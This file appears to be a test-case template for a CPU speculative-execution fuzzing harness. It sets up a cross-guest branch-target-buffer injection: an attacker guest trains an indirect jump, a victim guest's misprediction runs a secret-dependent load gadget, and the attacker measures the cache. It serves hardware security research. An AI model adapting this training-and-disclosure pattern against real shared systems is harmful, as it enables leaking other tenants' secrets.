.intel_syntax noprefix

# ============================================================================
# v2v injection — guest-user attacker trains the btb; guest-user victim
# mispredicts into a disclosure gadget that leaks the victim's own secret.
#
# why v2v: both actors are guests, so both execute at the same guest-virtual
# base (guest_v_memory_start=0). the attacker's `train` and the victim's
# `vmvictim_1` are each the first function in their section (offset 0) and share
# an identical prefix, so their indirect jmps sit at the same virtual address ->
# the btb source collides "for free". this is the alignment k2u/gs->hu could not
# get; here it isolates the question "does injection work at all in this harness?"
# from the alignment problem.
#
# direction (opposite of the residue template.asm):
#   attacker (vm)      : trains btb[jmp pc] = disclosure, then f+r measures.
#   victim  (vmvictim) : arch jmp -> safe; mispredict -> disclosure, which
#                        transiently loads [r14 + secret] and imprints a cache
#                        line the attacker reads back via the shared channel.
# channel: x86_enable_hpa_gpa_collisions (both guests' data gpa -> main's hpa).
#
# alignment detail: attacker `disclosure` is padded by a `safe`-sized block so it
# lands at the same in-section offset as the victim's `disclosure` (btb target
# also collides). both landings are landing_h2g (same size) -> no extra pad.
#
# control: template-v2v-inject-no-jmp.asm removes both jmps (expect clean).
# the shared channel is the same one the residue test (template.asm) already uses
# and reproduces with, so it needs no separate positive control here.
# ============================================================================

# ----------------------------- host orchestrator ----------------------------
.section .data.main
.function_main_0:
.macro.set_h2g_target.vm.function_vm_0: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_1: nop qword ptr [rax + 0xff]
.macro.switch_h2g.vm.0: nop qword ptr [rax + 0xff]

.function_main_1:
.macro.landing_g2h.main_1: nop qword ptr [rax + 0xff]
# attacker (vm) trains the btb
.macro.set_h2g_target.vm.function_vm_train: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_2: nop qword ptr [rax + 0xff]
.macro.switch_h2g.vm.1: nop qword ptr [rax + 0xff]

.function_main_2:
.macro.landing_g2h.main_2: nop qword ptr [rax + 0xff]
# run the guest victim (mispredict -> disclosure); no ibpb in between
.macro.set_h2g_target.vmvictim.function_vmvictim_1: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_3: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
xor rbx, rbx  # noremove
xor rcx, rcx  # noremove
xor rdx, rdx  # noremove
xor rsi, rsi  # noremove
xor rdi, rdi  # noremove
.macro.switch_h2g.vmvictim.1: nop qword ptr [rax + 0xff]

.function_main_3:
.macro.landing_g2h.main_3: nop qword ptr [rax + 0xff]
.macro.fault_handler: nop qword ptr [rax + 0xff]
.patch_placeholder_fault_handler:
# attacker measures
.macro.set_h2g_target.vm.function_vm_measure: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_4: nop qword ptr [rax + 0xff]
.macro.switch_h2g.vm.2: nop qword ptr [rax + 0xff]

.function_main_4:
.macro.landing_g2h.main_4: nop qword ptr [rax + 0xff]
nop


# ----------------------------- attacker (guest user, observer) --------------
# function_vm_train first (offset 0) to mirror function_vmvictim_1.
.section .data.vm
.function_vm_train:
.macro.landing_h2g.vm_1: nop qword ptr [rax + 0xff]
# mirror the victim's prefix exactly (same 6 loads at fixed addrs -> fixed,
# input-independent footprint; values are not used as addresses, so no leak).
xor rax, rax  # noremove
mov rax, qword ptr [r14 + 0x2000] # noremove
mov rbx, qword ptr [r14 + 0x2008] # noremove
mov rcx, qword ptr [r14 + 0x2010] # noremove
mov rdx, qword ptr [r14 + 0x2018] # noremove
mov rsi, qword ptr [r14 + 0x2020] # noremove
mov rdi, qword ptr [r14 + 0x2028] # noremove
mfence # noremove
lea rax, qword ptr [rip + .function_vm_disclosure]  # noremove
jmp rax  # noremove                                 # trains btb[this pc] = disclosure

# pad matching vmvictim_safe (lfence + switch_g2h + lfence); skipped by the jmp.
.function_vm_safe:
lfence  # noremove
.macro.switch_g2h.main.vm_safe: nop qword ptr [rax + 0xff]
lfence  # noremove

.function_vm_disclosure:
lfence  # noremove   (architectural jmp target; inert in the attacker)
.macro.switch_g2h.main.vm_1: nop qword ptr [rax + 0xff]
lfence

.function_vm_0:
.macro.landing_h2g.vm_0: nop qword ptr [rax + 0xff]
.macro.measurement_start.vm_0: nop qword ptr [rax + 0xff]
.macro.switch_g2h.main.vm_0: nop qword ptr [rax + 0xff]
lfence

.function_vm_measure:
.macro.landing_h2g.vm_2: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
xor rbx, rbx  # noremove
xor rcx, rcx  # noremove
xor rdx, rdx  # noremove
xor rsi, rsi  # noremove
xor rdi, rdi  # noremove
.macro.measurement_end.vm_2: nop qword ptr [rax + 0xff]
.macro.switch_g2h.main.2: nop qword ptr [rax + 0xff]
lfence


# ----------------------------- victim (guest user) --------------------------
.section .data.vmvictim
.function_vmvictim_1:
.macro.landing_h2g.vmvictim_1: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
mov rax, qword ptr [r14 + 0x2000] # noremove   (secret input in rax)
mov rbx, qword ptr [r14 + 0x2008] # noremove
mov rcx, qword ptr [r14 + 0x2010] # noremove
mov rdx, qword ptr [r14 + 0x2018] # noremove
mov rsi, qword ptr [r14 + 0x2020] # noremove
mov rdi, qword ptr [r14 + 0x2028] # noremove
mfence # noremove
lea rbx, qword ptr [rip + .function_vmvictim_safe]  # noremove
jmp rbx  # noremove                     # arch -> safe;  mispredict -> disclosure

.function_vmvictim_safe:
lfence  # noremove
.macro.switch_g2h.main.vmvictim_1: nop qword ptr [rax + 0xff]
lfence

.function_vmvictim_disclosure:
# mask to a cache-line index within the main page (shared via the collision).
and rax, 0b111111000000  # noremove
mov rcx, qword ptr [r14 + rax]   # noremove   (transient: secret-dependent load)
and rcx, 0b111111000000  # noremove
mov rdx, qword ptr [r14 + rcx]   # noremove   (transient: imprint into cache)
lfence  # noremove
.macro.switch_g2h.main.vmvictim_2: nop qword ptr [rax + 0xff]
lfence


# ----------------------------- exit -----------------------------------------
.section .data.main
.test_case_exit:nop
